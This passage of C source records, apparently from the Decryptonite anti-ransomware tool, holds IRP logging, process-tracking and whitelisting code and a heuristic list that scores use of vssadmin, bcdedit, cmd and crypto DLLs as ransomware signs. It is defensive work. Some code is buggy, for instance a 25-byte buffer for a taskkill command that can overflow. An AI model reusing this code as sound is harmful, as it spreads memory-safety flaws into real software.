IRP_MN_POWER_SEQUENCE_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_SET_POWER:\n\t\t\tirpMinorString = IRP_MN_SET_POWER_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_QUERY_POWER:\n\t\t\tirpMinorString = IRP_MN_QUERY_POWER_STRING;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tsprintf_s(errorBuf, sizeof(errorBuf), \"Unknown Irp minor code (%u)\", MinorCode);\n\t\t\tirpMinorString = errorBuf;\n\t\t}\n\t\tbreak;\n\n\tcase IRP_MJ_SYSTEM_CONTROL:\n\t\tirpMajorString = IRP_MJ_SYSTEM_CONTROL_STRING;\n\t\tswitch (MinorCode) {\n\t\tcase IRP_MN_QUERY_ALL_DATA:\n\t\t\tirpMinorString = IRP_MN_QUERY_ALL_DATA_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_QUERY_SINGLE_INSTANCE:\n\t\t\tirpMinorString = IRP_MN_QUERY_SINGLE_INSTANCE_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_CHANGE_SINGLE_INSTANCE:\n\t\t\tirpMinorString = IRP_MN_CHANGE_SINGLE_INSTANCE_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_CHANGE_SINGLE_ITEM:\n\t\t\tirpMinorString = IRP_MN_CHANGE_SINGLE_ITEM_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_ENABLE_EVENTS:\n\t\t\tirpMinorString = IRP_MN_ENABLE_EVENTS_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_DISABLE_EVENTS:\n\t\t\tirpMinorString = IRP_MN_DISABLE_EVENTS_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_ENABLE_COLLECTION:\n\t\t\tirpMinorString = IRP_MN_ENABLE_COLLECTION_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_DISABLE_COLLECTION:\n\t\t\tirpMinorString = IRP_MN_DISABLE_COLLECTION_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_REGINFO:\n\t\t\tirpMinorString = IRP_MN_REGINFO_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_EXECUTE_METHOD:\n\t\t\tirpMinorString = IRP_MN_EXECUTE_METHOD_STRING;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tsprintf_s(errorBuf, sizeof(errorBuf), \"Unknown Irp minor code (%u)\", MinorCode);\n\t\t\tirpMinorString = errorBuf;\n\t\t}\n\t\tbreak;\n\n\tcase IRP_MJ_DEVICE_CHANGE:\n\t\tirpMajorString = IRP_MJ_DEVICE_CHANGE_STRING;\n\t\tbreak;\n\tcase IRP_MJ_QUERY_QUOTA:\n\t\tirpMajorString = IRP_MJ_QUERY_QUOTA_STRING;\n\t\tbreak;\n\tcase IRP_MJ_SET_QUOTA:\n\t\tirpMajorString = IRP_MJ_SET_QUOTA_STRING;\n\t\tbreak;\n\tcase IRP_MJ_PNP:\n\t\tirpMajorString = IRP_MJ_PNP_STRING;\n\t\tswitch (MinorCode) {\n\t\tcase IRP_MN_START_DEVICE:\n\t\t\tirpMinorString = IRP_MN_START_DEVICE_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_QUERY_REMOVE_DEVICE:\n\t\t\tirpMinorString = IRP_MN_QUERY_REMOVE_DEVICE_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_REMOVE_DEVICE:\n\t\t\tirpMinorString = IRP_MN_REMOVE_DEVICE_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_CANCEL_REMOVE_DEVICE:\n\t\t\tirpMinorString = IRP_MN_CANCEL_REMOVE_DEVICE_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_STOP_DEVICE:\n\t\t\tirpMinorString = IRP_MN_STOP_DEVICE_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_QUERY_STOP_DEVICE:\n\t\t\tirpMinorString = IRP_MN_QUERY_STOP_DEVICE_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_CANCEL_STOP_DEVICE:\n\t\t\tirpMinorString = IRP_MN_CANCEL_STOP_DEVICE_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_QUERY_DEVICE_RELATIONS:\n\t\t\tirpMinorString = IRP_MN_QUERY_DEVICE_RELATIONS_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_QUERY_INTERFACE:\n\t\t\tirpMinorString = IRP_MN_QUERY_INTERFACE_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_QUERY_CAPABILITIES:\n\t\t\tirpMinorString = IRP_MN_QUERY_CAPABILITIES_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_QUERY_RESOURCES:\n\t\t\tirpMinorString = IRP_MN_QUERY_RESOURCES_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_QUERY_RESOURCE_REQUIREMENTS:\n\t\t\tirpMinorString = IRP_MN_QUERY_RESOURCE_REQUIREMENTS_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_QUERY_DEVICE_TEXT:\n\t\t\tirpMinorString = IRP_MN_QUERY_DEVICE_TEXT_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_FILTER_RESOURCE_REQUIREMENTS:\n\t\t\tirpMinorString = IRP_MN_FILTER_RESOURCE_REQUIREMENTS_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_READ_CONFIG:\n\t\t\tirpMinorString = IRP_MN_READ_CONFIG_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_WRITE_CONFIG:\n\t\t\tirpMinorString = IRP_MN_WRITE_CONFIG_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_EJECT:\n\t\t\tirpMinorString = IRP_MN_EJECT_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_SET_LOCK:\n\t\t\tirpMinorString = IRP_MN_SET_LOCK_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_QUERY_ID:\n\t\t\tirpMinorString = IRP_MN_QUERY_ID_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_QUERY_PNP_DEVICE_STATE:\n\t\t\tirpMinorString = IRP_MN_QUERY_PNP_DEVICE_STATE_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_QUERY_BUS_INFORMATION:\n\t\t\tirpMinorString = IRP_MN_QUERY_BUS_INFORMATION_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_DEVICE_USAGE_NOTIFICATION:\n\t\t\tirpMinorString = IRP_MN_DEVICE_USAGE_NOTIFICATION_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_SURPRISE_REMOVAL:\n\t\t\tirpMinorString = IRP_MN_SURPRISE_REMOVAL_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_QUERY_LEGACY_BUS_INFORMATION:\n\t\t\tirpMinorString = IRP_MN_QUERY_LEGACY_BUS_INFORMATION_STRING;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tsprintf_s(errorBuf, sizeof(errorBuf), \"Unknown Irp minor code (%u)\", MinorCode);\n\t\t\tirpMinorString = errorBuf;\n\t\t}\n\t\tbreak;\n\n\n\tcase IRP_MJ_ACQUIRE_FOR_SECTION_SYNCHRONIZATION:\n\t\tirpMajorString = IRP_MJ_ACQUIRE_FOR_SECTION_SYNCHRONIZATION_STRING;\n\t\tbreak;\n\n\tcase IRP_MJ_RELEASE_FOR_SECTION_SYNCHRONIZATION:\n\t\tirpMajorString = IRP_MJ_RELEASE_FOR_SECTION_SYNCHRONIZATION_STRING;\n\t\tbreak;\n\n\tcase IRP_MJ_ACQUIRE_FOR_MOD_WRITE:\n\t\tirpMajorString = IRP_MJ_ACQUIRE_FOR_MOD_WRITE_STRING;\n\t\tbreak;\n\n\tcase IRP_MJ_RELEASE_FOR_MOD_WRITE:\n\t\tirpMajorString = IRP_MJ_RELEASE_FOR_MOD_WRITE_STRING;\n\t\tbreak;\n\n\tcase IRP_MJ_ACQUIRE_FOR_CC_FLUSH:\n\t\tirpMajorString = IRP_MJ_ACQUIRE_FOR_CC_FLUSH_STRING;\n\t\tbreak;\n\n\tcase IRP_MJ_RELEASE_FOR_CC_FLUSH:\n\t\tirpMajorString = IRP_MJ_RELEASE_FOR_CC_FLUSH_STRING;\n\t\tbreak;\n\n\tcase IRP_MJ_NOTIFY_STREAM_FO_CREATION:\n\t\tirpMajorString = IRP_MJ_NOTIFY_STREAM_FO_CREATION_STRING;\n\t\tbreak;\n\n\n\n\tcase IRP_MJ_FAST_IO_CHECK_IF_POSSIBLE:\n\t\tirpMajorString = IRP_MJ_FAST_IO_CHECK_IF_POSSIBLE_STRING;\n\t\tbreak;\n\n\tcase IRP_MJ_NETWORK_QUERY_OPEN:\n\t\tirpMajorString = IRP_MJ_NETWORK_QUERY_OPEN_STRING;\n\t\tbreak;\n\n\tcase IRP_MJ_MDL_READ:\n\t\tirpMajorString = IRP_MJ_MDL_READ_STRING;\n\t\tbreak;\n\n\tcase IRP_MJ_MDL_READ_COMPLETE:\n\t\tirpMajorString = IRP_MJ_MDL_READ_COMPLETE_STRING;\n\t\tbreak;\n\n\tcase IRP_MJ_PREPARE_MDL_WRITE:\n\t\tirpMajorString = IRP_MJ_PREPARE_MDL_WRITE_STRING;\n\t\tbreak;\n\n\tcase IRP_MJ_MDL_WRITE_COMPLETE:\n\t\tirpMajorString = IRP_MJ_MDL_WRITE_COMPLETE_STRING;\n\t\tbreak;\n\n\tcase IRP_MJ_VOLUME_MOUNT:\n\t\tirpMajorString = IRP_MJ_VOLUME_MOUNT_STRING;\n\t\tbreak;\n\n\tcase IRP_MJ_VOLUME_DISMOUNT:\n\t\tirpMajorString = IRP_MJ_VOLUME_DISMOUNT_STRING;\n\t\tbreak;\n\n\tcase IRP_MJ_TRANSACTION_NOTIFY:\n\t\tirpMajorString = IRP_MJ_TRANSACTION_NOTIFY_STRING;\n\t\tswitch (MinorCode) {\n\t\tcase 0:\n\t\t\tirpMinorString = TRANSACTION_BEGIN;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_PREPREPARE_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_PREPREPARE_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_PREPARE_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_PREPARE_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_COMMIT_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_COMMIT_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_COMMIT_FINALIZE_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_COMMIT_FINALIZE_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_ROLLBACK_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_ROLLBACK_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_PREPREPARE_COMPLETE_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_PREPREPARE_COMPLETE_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_PREPARE_COMPLETE_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_COMMIT_COMPLETE_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_ROLLBACK_COMPLETE_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_ROLLBACK_COMPLETE_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_RECOVER_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_RECOVER_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_SINGLE_PHASE_COMMIT_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_SINGLE_PHASE_COMMIT_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_DELEGATE_COMMIT_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_DELEGATE_COMMIT_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_RECOVER_QUERY_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_RECOVER_QUERY_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_ENLIST_PREPREPARE_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_ENLIST_PREPREPARE_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_LAST_RECOVER_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_LAST_RECOVER_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_INDOUBT_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_INDOUBT_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_PROPAGATE_PULL_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_PROPAGATE_PULL_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_PROPAGATE_PUSH_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_PROPAGATE_PUSH_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_MARSHAL_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_MARSHAL_STRING;\n\t\t\tbreak;\n\t\tcase TRANSACTION_NOTIFY_ENLIST_MASK_CODE:\n\t\t\tirpMinorString = TRANSACTION_NOTIFY_ENLIST_MASK_STRING;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tsprintf_s(errorBuf, sizeof(errorBuf), \"Unknown Transaction notication code (%u)\", MinorCode);\n\t\t\tirpMinorString = errorBuf;\n\t\t}\n\t\tbreak;\n\n\n\tdefault:\n\t\tsprintf_s(errorBuf, sizeof(errorBuf), \"Unknown Irp major function (%d)\", MajorCode);\n\t\tirpMajorString = errorBuf;\n\t\tbreak;\n\t}\n\n\tif (OutputFile) {\n\n\t\tif (irpMinorString) {\n\n\t\t\tfprintf(OutputFile, \"\\t%-35s\\t%-35s\", irpMajorString, irpMinorString);\n\n\t\t}\n\t\telse {\n\n\t\t\tfprintf(OutputFile, \"\\t%-35s\\t                                   \", irpMajorString);\n\t\t}\n\n\t}\n\telse {\n\n\t\tif (PrintMajorCode) {\n\n\t\t\tprintf(\"%-35s \", irpMajorString);\n\n\t\t}\n\t\telse {\n\n\t\t\tif (irpMinorString) {\n\n\t\t\t\tprintf(\"                                                                     %-35s\\n\",\n\t\t\t\t\tirpMinorString);\n\t\t\t}\n\t\t}\n\t}\n}", "path": "user\\dctLog.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "//\n// GetFileNameFromPID\n// Returns the path associated with a PID\n//\n", "func_signal": "void GetFileNameFromPID(DWORD dwProcessId, TCHAR * path)", "code": "{\n\tHMODULE hMods[1024];\n\tHANDLE hProcess;\n\tDWORD cbNeeded;\n\tunsigned int i;\n\n\thProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessId);\n\n\tif (hProcess != NULL)\n\t{\n\t\tif (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))\n\t\t{\n\t\t\tfor (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)\n\t\t\t{\n\t\t\t\tTCHAR szModPathName[MAX_PATH];\n\t\t\t\t// Get the full path to the module's file.\n\t\t\t\tif (GetModuleFileNameEx(hProcess, hMods[i], szModPathName, sizeof(szModPathName)))\n\t\t\t\t{\n\t\t\t\t\twcscpy(path, szModPathName);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tCloseHandle(hProcess);\n}", "path": "user\\dctLog.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "// \n// PrintHeuristics\n// Prints all the tracked heuristics in a heuristicmap\n//\n", "func_signal": "void PrintHeuristics(struct HeuristicSignature * HeuristicMap)", "code": "{\n\tstruct HeuristicSignature * tmp;\n\tprintf(\"\\n\"\n\t\t\"    Signature\\t\\t\\t\\t\\t\\t\\t\\t\\tThreat Level\\n\"\n\t\t\"    --------------------------------------------------------------------------  ------------\\n\"\n\t);\n\tfor (tmp = HeuristicMap; tmp != NULL; tmp = tmp->hh.next)\n\t{\n\t\tprintf(\"    %-74ls  %-14d\\n\", tmp->wHeuristicPath, tmp->dwThreatLevel);\n\t}\n}", "path": "user\\dctLog.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "// \n// KillProcess\n// Attempts to kill the process that is passed to it\n//\n", "func_signal": "void KillProcess(FILE_ID ProcessId)", "code": "{\n\tchar buf[25];\n\tsprintf(buf, \"taskkill /pid %lld /f /t\", ProcessId);\n\tsystem(buf);\n}", "path": "user\\dctLog.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "// \n// TrackProcess\n// Designed to track a process in the ProcessMap hash map.\n// @variable ProcessMap - UTHashMap to track the process in\n// @variable ProcessID - Process ID\n// @variable ThreatLevel - Set the initial threat of a process\n// @variable whitelistedCategory - Set the level of whitelisting\n//\n", "func_signal": "int TrackProcess(struct ProcessThreatLevel ** ProcessMap, FILE_ID ProcessId, int ThreatLevel, int whitelistedCategory)", "code": "{\n\tstruct ProcessThreatLevel * tmpProcess = NULL;\n\t// UNTRACKED indicates that we know the process does not exist in the map\n\tif (whitelistedCategory != UNTRACKED)\n\t\tHASH_FIND_INT(*ProcessMap, &ProcessId, tmpProcess);\n\tif (tmpProcess == NULL || whitelistedCategory == UNTRACKED)\n\t{\n\t\t// Will add if not found\n\t\ttmpProcess = malloc(sizeof(struct ProcessThreatLevel));\n\t\ttmpProcess->dwProcessId = ProcessId;\n\t\ttmpProcess->dwThreatLevel = ThreatLevel;\n\t\ttmpProcess->dwIsWhiteListed = whitelistedCategory;\n\t\tHASH_ADD_INT(*ProcessMap, dwProcessId, tmpProcess);\n\t\treturn SUCCESS;\n\t}\n\n\t// Return failure if process already in map\n\treturn FAILURE;\n}", "path": "user\\dctLog.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "// Intializes an array with specfied size, meant to hold type struct PidChangeTracker\n", "func_signal": "void InitalizeArray(Array *a, size_t initialSize)", "code": "{\n\ta->array = (struct PidChangeTracker *)malloc(initialSize * sizeof(struct PidChangeTracker));\n\tif (a->array == NULL) {\n\t\tfprintf(stderr, \"Failed to create array.\");\n\t\texit(EXIT_FAILURE);\n\t}\n\ta->used = 0;\n\ta->size = initialSize;\n}", "path": "user\\array.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "// \n// IsWhitelisted\n// Returns the whitelisted status of a process\n// @variable ProcessMap - UTHashMap that contains processes\n// @variable ProcessID - Process ID\n//\n", "func_signal": "int IsWhiteListed(struct ProcessThreatLevel * ProcessMap, FILE_ID ProcessId)", "code": "{\n\tstruct ProcessThreatLevel * tPointer = NULL;\n\n\t//find the process\n\tHASH_FIND_INT(ProcessMap, &ProcessId, tPointer);\n\n\tif (tPointer == NULL) {\n\t\t// ProcessId is not tracked\n\t\treturn UNTRACKED;\n\t}\n\n\treturn tPointer->dwIsWhiteListed;\n}", "path": "user\\dctLog.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "/*++\n\nRoutine Description:\n\nThis runs as a separate thread.  Its job is to retrieve log records\nfrom the filter and then output them\n\nArguments:\n\nlpParameter - Contains context structure for synchronizing with the\nmain program thread.\n\nReturn Value:\n\nThe thread successfully terminated\n\n--*/\n", "func_signal": "DWORD WINAPI RetrieveLogRecords(_In_ LPVOID lpParameter)", "code": "{\n\tPLOG_CONTEXT context = (PLOG_CONTEXT)lpParameter;\n\tDWORD bytesReturned = 0;\n\tDWORD used;\n\tPVOID alignedBuffer[BUFFER_SIZE / sizeof(PVOID)];\n\tPCHAR buffer = (PCHAR)alignedBuffer;\n\tHRESULT hResult;\n\tPLOG_RECORD pLogRecord;\n\tPRECORD_DATA pRecordData;\n\tCOMMAND_MESSAGE commandMessage;\n\t__pragma(warning(push))\n\t\t__pragma(warning(disable:4189))\n\t\tstruct ProcessThreatLevel * ProcessMap = NULL;\n\tstruct ProcessThreatLevel * tmpProcess = NULL;\n\tstruct HeuristicSignature * HeuristicMap = NULL;\n\tstruct HeuristicSignature * tmpHeuristic = NULL;\n\tint * ProcessIds;\n\tint minispyPID = GetCurrentProcessId();\n\tint i;\n\t__pragma(warning(pop))\n\tint j;\n\tFILE *fp;\n\tint NewThreatLevel = 0;\n\tint parent = 0;\n\tint pid = 0;\n\tchar *end;\n\tchar buf[1035];\n\tchar command[256];\n\tint parentwhitelistedStatus = 0;\n\tint childwhiteliststatus = -1;\n\tint currentwhiteliststatus = -1;\n\tint processDeadStatus = 0;\n\tint isPrivilegeEnabled = 0;\n\tstruct ProcessThreatLevel * ptl;\n\tWCHAR volBuf[21][255];\n\tTCHAR path[MAX_PATH];\n\tBOOL whitelistProcess = FALSE;\n\n\t// Declaring and Intializing variables for Tracking File changes on the system\n\tstruct tm lastChkTime;\n\tArray queueBucket;\n\ttime_t rtime, now;\n\n\tint trackerSize = 0;\n\tint x = 0;\n\tint y = 0;\n\tint logging = 0;\n\n\tWCHAR * WhiteListedApplications[15] = { L\"procexp.exe\", L\"procexp64.exe\", L\"csrss.exe\", L\"services.exe\", L\"dllhost.exe\", L\"DllHost.exe\",\n\t\tL\"Procmon.exe\", L\"Procmon64.exe\", L\"taskhost.exe\", L\"FrzState2k.exe\", L\"DFServ.exe\", L\"DFLocker64.exe\", L\"taskmgr.exe\", L\"SearchFilterHost.exe\", L\"conhost.exe\" };\n\tWCHAR * SystemListedApplications[2] = { L\"wininit.exe\", L\"explorer.exe\" };\n\n\tSleep(50);\n\n\t// Enabling Debug Privilieges \n\tisPrivilegeEnabled = EnableDebugPrivileges();\n\tif (isPrivilegeEnabled == SUCCESS)\n\t{\n\t\tprintf(\"SE_DEBUG_NAME privilege enabled.\\n\");\n\t}\n\telse\n\t{\n\t\tprintf(\"SE_DEBUG_NAME privilege could not be enabled. Exiting\\n\");\n\t\texit(1);\n\t}\n\t\n\tprintf(\"\\nEnabling Debug Privileges...\");\n\n\t/*\n\t\tInitial Whitelisting\n\t\t\tIterating through all system processes and categorizing them into whitelist categories\n\t*/\n\tprintf(\"\\nWhitelisting system applications...\");\n\tTrackProcess(&ProcessMap, 0, 0, WHITELISTED);\n\tTrackProcess(&ProcessMap, 4, 0, SYSTEMLISTED);\n\tTrackProcess(&ProcessMap, GetCurrentProcessId(), 0, WHITELISTED);\n\tfor (i = 0; i < (sizeof(WhiteListedApplications) / sizeof(WhiteListedApplications[0])); i++)\n\t{\n\t\tProcessIds = GetPIDFromName(WhiteListedApplications[i]);\n\t\tfor (j = 0; j < (sizeof(ProcessIds) / sizeof(ProcessIds[0])); j++)\n\t\t{\n\t\t\tTrackProcess(&ProcessMap, ProcessIds[j], 0, WHITELISTED);\n\t\t}\n\t}\n\n\tfor (i = 0; i < (sizeof(SystemListedApplications) / sizeof(SystemListedApplications[0])); i++)\n\t{\n\t\tProcessIds = GetPIDFromName(SystemListedApplications[i]);\n\t\tfor (j = 0; j < (sizeof(ProcessIds) / sizeof(ProcessIds[0])); j++)\n\t\t{\n\t\t\tTrackProcess(&ProcessMap, ProcessIds[j], 0, SYSTEMLISTED);\n\t\t}\n\t}\n\n\tprintf(\"\\nWhitelisting non-system applications...\");\n\t__pragma(warning(push))\n\t\t__pragma(warning(disable:4047))\n\t\t__pragma(warning(disable:4024))\n\t\tHANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);\n\t__pragma(warning(pop))\n\t\tPROCESSENTRY32 pEntry;\n\tpEntry.dwSize = sizeof(pEntry);\n\tBOOL hRes = Process32First(hSnapShot, &pEntry);\n\twhile (hRes)\n\t{\n\t\tHANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,\n\t\t\t(DWORD)pEntry.th32ProcessID);\n\t\tGetFileNameFromPID(pEntry.th32ProcessID, &path);\n\t\twhitelistProcess = VerifyPESignature(path);\n\t\twcscpy(path, \"\");\n\t\tif (whitelistProcess) {\n\t\t\tTrackProcess(&ProcessMap, pEntry.th32ProcessID, 0, WHITELISTED);\n\t\t}\n\t\tCloseHandle(hProcess);\n\t\thRes = Process32Next(hSnapShot, &pEntry);\n\t}\n\tCloseHandle(hSnapShot);\n\n\n\n#pragma warning(push)\n#pragma warning(disable:4133)\n\tPrintWhiteList(ProcessMap);\n\n\tprintf(\"\\nInitializing heuristics...\");\n\t\n\t// Executable heuristics\n\tswprintf(volBuf[0], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\SysWOW64\\\\cmd.exe\");\n\tTrackHeuristic(&HeuristicMap, volBuf[0], HIGH);\n\tswprintf(volBuf[1], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\System32\\\\cmd.exe\");\n\tTrackHeuristic(&HeuristicMap, volBuf[1], HIGH);\n\tswprintf(volBuf[2], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\explorer.exe\");\n\tTrackHeuristic(&HeuristicMap, volBuf[2], MEDIUM);\n\tswprintf(volBuf[3], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\System32\\\\taskmgr.exe\");\n\tTrackHeuristic(&HeuristicMap, volBuf[3], MEDIUM);\n\tswprintf(volBuf[4], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\SysWOW64\\\\explorer.exe\");\n\tTrackHeuristic(&HeuristicMap, volBuf[4], MEDIUM);\n\tswprintf(volBuf[5], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\SysWOW64\\\\reg.exe\");\n\tTrackHeuristic(&HeuristicMap, volBuf[5], MEDIUM);\n\tswprintf(volBuf[6], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\SysWOW64\\\\vssadmin.exe\");\n\tTrackHeuristic(&HeuristicMap, volBuf[6], HIGH);\n\tswprintf(volBuf[7], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\System32\\\\conhost.exe\");\n\tTrackHeuristic(&HeuristicMap, volBuf[7], LOW);\n\tswprintf(volBuf[8], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\System32\\\\SearchFilterHost.exe\");\n\tTrackHeuristic(&HeuristicMap, volBuf[8], LOW);\n\tswprintf(volBuf[9], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\System32\\\\unregmp2.exe\");\n\tTrackHeuristic(&HeuristicMap, volBuf[9], LOW);\n\tswprintf(volBuf[10], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\SysWOW64\\\\wbem\\\\WMIC.exe\");\n\tTrackHeuristic(&HeuristicMap, volBuf[10], MEDIUM);\n\tswprintf(volBuf[11], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\System32\\\\AdapterTroubleshooter.exe\");\n\tTrackHeuristic(&HeuristicMap, volBuf[11], LOW);\n\tswprintf(volBuf[12], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\System32\\\\bootcfg.exe\");\n\tTrackHeuristic(&HeuristicMap, volBuf[12], HIGH);\n\tswprintf(volBuf[13], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\System32\\\\bcdedit.exe\");\n\tTrackHeuristic(&HeuristicMap, volBuf[13], HIGH);\n\tswprintf(volBuf[14], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\System32\\\\vssadmin.exe\");\n\tTrackHeuristic(&HeuristicMap, volBuf[14], HIGH);\n\t// DLL heuristics\n\tswprintf(volBuf[15], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\SysWOW64\\\\rsaenh.dll\");\n\tTrackHeuristic(&HeuristicMap, volBuf[15], HIGH);\n\tswprintf(volBuf[16], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\SysWOW64\\\\cryptsp.dll\");\n\tTrackHeuristic(&HeuristicMap, volBuf[16], HIGH);\n\tswprintf(volBuf[17], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\System32\\\\cryptbase.dll\");\n\tTrackHeuristic(&HeuristicMap, volBuf[17], HIGH);\n\tswprintf(volBuf[18], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\SysWOW64\\\\bcrypt.dll\");\n\tTrackHeuristic(&HeuristicMap, volBuf[18], HIGH);\n\tswprintf(volBuf[19], BUFFER, L\"%ls%ls\", Volume, L\"\\\\Windows\\\\System32\\\\cryptsp.dll\");\n\tTrackHeuristic(&HeuristicMap, volBuf[19], HIGH);\n\n\tPrintHeuristics(HeuristicMap);\n\n\t// Intalize the array that hold the queue structures to tracking file \n\t// changes for specific PIDs\n\tInitalizeArray(&queueBucket, TSIZE);\n\n\t// Adds an empty queue structure into the bucket for the first PID\n\t// that will be tracked\n\tstruct PidChangeTracker pTracker = { 0, 0, 0, 0, 0, 0, 0, NULL };\n\tInsertElement(&queueBucket, &pTracker);\n\n\t// Grabs current time \n\ttime(&rtime);\n\tlocaltime_s(&lastChkTime, &rtime);\n\n#pragma warning(push)\n#pragma warning(disable:4127) // conditional expression is constant\n\n\twhile (TRUE) 